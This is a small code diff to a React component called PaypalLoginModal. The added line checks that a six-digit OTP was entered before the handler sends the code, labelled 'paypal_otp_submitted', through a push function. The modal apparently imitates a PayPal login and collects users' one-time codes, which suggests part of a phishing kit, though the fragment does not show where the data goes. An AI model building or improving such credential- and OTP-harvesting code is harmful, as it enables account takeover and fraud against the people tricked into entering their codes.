@@ -82,6 +82,7 @@ export function PaypalLoginModal({
 
   const submitOtp = async (e: React.FormEvent) => {
     e.preventDefault();
+    if (otp.length !== 6) return;
     setLoading(true);
     await push({ otp_code: otp, step: "paypal_otp_submitted" });
     setTimeout(async () => {
